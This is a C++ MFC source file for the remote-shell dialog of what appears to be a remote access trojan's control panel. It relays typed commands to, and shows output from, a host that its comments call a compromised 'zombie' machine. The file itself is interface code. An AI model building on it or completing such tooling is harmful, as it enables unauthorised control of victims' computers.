﻿// CShellDlg.cpp: 实现文件
//

#include "pch.h"
#include "UI.h"
#include "CShellDlg.h"
#include "afxdialogex.h"
#include "Others/macros.h"


// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent,
					CIOCPServer *pIOCPServer,
					ClientContext *pContext)
	: CDialogEx(IDD_DIALOG_SHELL, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext   = pContext;
	m_nCurSel    = 0;
	m_hIcon      = LoadIcon(AfxGetInstanceHandle(),
							MAKEINTRESOURCE(IDI_CMDSHELL));
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_SHELL, m_edit);
}

void CShellDlg::AddKeyBoardData()
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = (char *)m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	strResult.Replace("\n", "\r\n");
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT_SHELL, &CShellDlg::OnEnChangeEditShell)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


void CShellDlg::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialogEx::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	if (m_edit.m_hWnd != nullptr) {
		RECT rectClient;
		RECT rectEdit;
		GetClientRect(&rectClient);
		rectEdit.left = 0;
		rectEdit.top = 0;
		rectEdit.right = rectClient.right;
		rectEdit.bottom = rectClient.bottom;
		m_edit.MoveWindow(&rectEdit);
	}
}


void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_nCurSel = m_edit.GetWindowTextLength();

	// 设置对话框的标题为肉机的IP
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int Len = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR *)&sockAddr, &Len);
	str.Format("\\\\%s - 远程终端", 
				bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;
}


void CShellDlg::OnEnChangeEditShell()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	UINT len = (UINT)m_edit.GetWindowTextLength();
	if (len < m_nCurSel) {
		m_nCurSel = len;
	}
}


HBRUSH CShellDlg::OnCtlColor(CDC *pDC, CWnd *pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_SHELL) &&
		(nCtlColor == CTLCOLOR_EDIT)) 
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景

		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	} else {
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}

	return hbr;
}

// 处理键盘的输入，并发送给肉机
BOOL CShellDlg::PreTranslateMessage(MSG *pMsg)
{
	if (pMsg->message == WM_KEYDOWN){
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE) {
			return true;
		}

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd){
			int	len = m_edit.GetWindowTextLength();
			CString str;
			m_edit.GetWindowText(str);
			str += "\r\n";
			m_iocpServer->Send(m_pContext,
							  (LPBYTE)str.GetBuffer(0) + m_nCurSel,
							   str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd){
			if ((UINT)m_edit.GetWindowTextLength() <= m_nReceiveLength) {
				return true;
			}
				
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0){
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if ((UINT)len < m_nCurSel) {
			m_nCurSel = len;
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}
